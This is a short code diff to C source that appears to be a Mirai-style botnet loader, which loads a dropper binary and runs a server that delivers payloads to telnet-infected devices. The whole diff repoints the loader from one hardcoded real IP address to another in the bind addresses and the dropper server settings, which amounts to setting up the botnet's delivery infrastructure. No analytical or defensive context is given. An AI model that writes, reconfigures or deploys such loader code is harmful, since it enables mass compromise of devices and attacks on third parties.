@@ -27,8 +27,8 @@ int main(int argc, char **args)
     struct telnet_info info;
     addrs_len = 2;
     addrs = calloc(addrs_len, sizeof (ipv4_t));
-    addrs[0] = inet_addr("185.172.110.232"); // Address to bind to
-    addrs[1] = inet_addr("185.172.110.232"); // Address to bind to
+    addrs[0] = inet_addr("173.232.146.173"); // Address to bind to
+    addrs[1] = inet_addr("173.232.146.173"); // Address to bind to
     if (argc == 2)
     {
         id_tag = args[1];
@@ -39,7 +39,7 @@ int main(int argc, char **args)
         printf("Failed to load bins/dlr.* as dropper\n");
         return 1;
     }
-    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "185.172.110.232", 80, "185.172.110.232")) == NULL)
+    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "173.232.146.173", 80, "173.232.146.173")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
